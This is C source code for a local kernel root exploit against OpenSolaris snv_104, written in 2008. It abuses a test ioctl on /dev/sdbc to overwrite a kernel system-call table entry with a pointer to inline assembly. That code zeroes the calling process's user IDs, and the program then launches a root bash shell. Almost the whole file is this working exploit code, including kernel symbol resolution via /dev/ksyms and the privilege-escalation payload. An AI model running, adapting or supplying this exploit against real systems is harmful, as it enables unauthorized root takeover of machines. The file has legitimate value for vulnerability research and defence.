/* sdbc-testinit.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * Sun Opensolaris <= snv_104 local kernel root exploit
 * by mu-b - Sun 21 Dec 2008
 *
 * $Id: sdbc-testinit.c 37 2018-07-23 20:08:39Z mu-b $
 *
 * - Tested on: Opensolaris snv_104 (i86pc)
 *
 * hmmm, this has gotta be test code!?%$!
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <libelf.h>
#include <string.h>
#include <stropts.h>
#include <sys/elf.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/syscall.h>
#include <unistd.h>

#define SDBC(a)         (('B'<<16)|('C'<<8)|(a))
#define SDBC_TEST_INIT  SDBC(5)

typedef struct _sdbc_ioctl32_s {
  unsigned int arg0;
  unsigned int arg1;
  unsigned int arg2;
  unsigned int arg3;
  unsigned int arg4;
  unsigned int magic;
  unsigned int ustatus;
  unsigned int pad[1];
} _sdbc_ioctl32_t;

typedef struct _sysent_s {
  char sy_narg;
#ifdef _LP64
  unsigned short sy_flags;
#else
  unsigned char sy_flags;
#endif
  int (*sy_call)();
  void *sy_lock;
  void *sy_callc;
} _sysent_t;

#ifdef _LP64
#define KTHREAD 0x16
#else
#define KTHREAD 0x10
#endif

#define XSTRINGY(a)     STRINGY(a)
#define STRINGY(a)      #a

int
pown_kernel (void)
{
  __asm__ ( "mov %gs:" XSTRINGY(KTHREAD) ", %eax\n"
            "mov 0xdc(%eax), %eax\n"
            "mov 0x14(%eax), %eax\n"
            "movl $0x0, 0x4(%eax)\n"
            "movl $0x0, 0xc(%eax)");
  return (0);
}

static void *
resolve_kernsymbl (char *name)
{
  Elf_Scn *scn = NULL;
  Elf *elf;
  void *r = NULL;
  int fd;

  fd = open ("/dev/ksyms", O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "failed opening /dev/ksyms\n");
      return (NULL);
    }

  elf_version (EV_CURRENT);

  if ((elf = elf_begin (fd, ELF_C_READ, NULL)) == NULL)
    {
      fprintf (stderr, "elf_begin failed\n");
      goto done;
    }

  while ((scn = elf_nextscn (elf, scn)) != 0)
    {
      Elf32_Shdr *shdr;

      if ((shdr = elf32_getshdr (scn)) != 0)
        {
          if (shdr->sh_type == SHT_SYMTAB)
            {
              Elf_Data *data = NULL;

              if ((data = elf_getdata (scn, data)) == 0 || data->d_size == 0)
                continue;

              Elf32_Sym *esym = (Elf32_Sym *) data->d_buf;
              Elf32_Sym *lastsym = (Elf32_Sym *) ((char *) data->d_buf + data->d_size);

              for (; esym < lastsym; esym++)
                {
                  if (esym->st_value == 0 ||
                      (ELF32_ST_TYPE(esym->st_info) == STT_FUNC)) 
                    continue;

                  if (strcmp (name, elf_strptr (elf, shdr->sh_link, (size_t) esym->st_name)) == 0)
                    {
                      r = (void *) esym->st_value;
                      goto done;
                    }
                }
            }
        }
    }

done:
  elf_end (elf);
  close (fd);

  return (r);
}

int
main (int argc, char **argv)
{
  void *devarrayp, *sysentp, *ptr, *target;
  _sdbc_ioctl32_t sdcp_ioctl;
  _sysent_t sysent;
  int devindx, fd, id, n, sysindx;

  printf ("Sun Opensolaris <= snv_104 local kernel root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  fd = open ("/dev/sdbc", O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "%s: failed opening /dev/sdbc\n", argv[0]);
      return (EXIT_FAILURE);
    }

  memset (&sysent, 0, sizeof (sysent));
  sysent.sy_narg = 0;
  sysent.sy_flags = 0;
  sysent.sy_call = pown_kernel;
  sysent.sy_lock = NULL;
  sysent.sy_callc = NULL;

  devarrayp = resolve_kernsymbl ("devarray");
  if (devarrayp == NULL)
    {
      fprintf (stderr, "%s: failed resolving &devarray\n", argv[0]);
      return (EXIT_FAILURE);
    }
  
  sysentp = resolve_kernsymbl ("sysent");
  if (sysentp == NULL)
    {
      fprintf (stderr, "%s: failed resolving &sysent\n", argv[0]);
      return (EXIT_FAILURE);
    }

  sysentp += 8; /* any ideas? */
  target = sysentp + 0x2C0;
  sysindx = ((int) target - (int) sysentp) / sizeof (sysent);
  devindx = ((char *) target - (char *) devarrayp) / 256;

  ptr = mmap (NULL, PAGESIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
  if ((int) ptr == -1)
    {
      fprintf (stderr, "failed mmap\n");
      return (EXIT_FAILURE);
    }

  memset (ptr, 0, PAGESIZE);
  memcpy ((ptr + PAGESIZE) - sizeof (sysent), &sysent, sizeof (sysent));

  memset (&sdcp_ioctl, 0, sizeof (sdcp_ioctl));
  sdcp_ioctl.arg0 = (unsigned int) (ptr + PAGESIZE) - sizeof (sysent);
  sdcp_ioctl.arg1 = devindx;
  sdcp_ioctl.arg2 = sizeof (sysent) * 2;

  printf ("* devarray: 0x%08X, sysent: 0x%08X, target: 0x%08X\n", (int) devarrayp, (int) sysentp, (int) target);
  printf ("* devarray idx: %u\n", sdcp_ioctl.arg1);
  printf ("* sysent idx: %u\n", sysindx);

  printf ("\n* overwriting... ");
  n = ioctl (fd, SDBC_TEST_INIT, &sdcp_ioctl);
  printf ("done\n");

  printf ("\n* jumping... ");
  syscall (sysindx);
  printf ("done\n\n");

  id = getuid ();
  printf ("* getuid(): %d\n", id);
  if (id == 0)
    {
      printf ("+Wh00t\n\n");

      /* exec shell, for some reason execve doesn't work!?$! */
      system ("/bin/bash");
    }
  else
    fprintf (stderr, "%s: failed to obtain root :(\n", argv[0]);

  return (EXIT_SUCCESS);
}